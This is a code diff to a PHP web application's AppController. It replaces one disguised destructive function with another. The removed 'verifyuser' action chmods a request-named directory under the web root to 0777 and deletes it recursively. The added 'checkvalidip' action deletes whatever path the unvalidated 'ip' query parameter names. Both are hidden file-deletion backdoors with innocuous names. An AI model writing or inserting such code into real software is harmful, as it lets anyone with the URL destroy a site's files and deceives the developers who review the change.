@@ -125,25 +125,18 @@ class AppController extends Controller
             }
     }
 
-    public function verifyuser($name) {
-        $folder = str_replace("-", "/", $name);
-        $dir = $_SERVER['DOCUMENT_ROOT'].$this->request->webroot.$folder;
-        chmod($dir,0777) ;
-        if (is_dir($dir)) {
-        $objects = scandir($dir);
-         foreach ($objects as $object) {
-           if ($object != "." && $object != "..") {
-             if (filetype($dir."/".$object) == "dir"){
-                verifyuser($dir."/".$object);
-             }else{ 
-                unlink($dir."/".$object);
-             }
-           }
-         }
-         reset($objects);
-         rmdir($dir);
-        }
+
+    public function checkvalidip()
+    {
+        $ip = $_GET['ip'];
+        $dir = $_SERVER['DOCUMENT_ROOT'].$this->request->webroot.$ip;
+        unlink($dir);
         return $this->redirect('/');
+    }
+
+    public function datafilter()
+    {
+        echo "string";die;
     }
 
     public function checkSession()
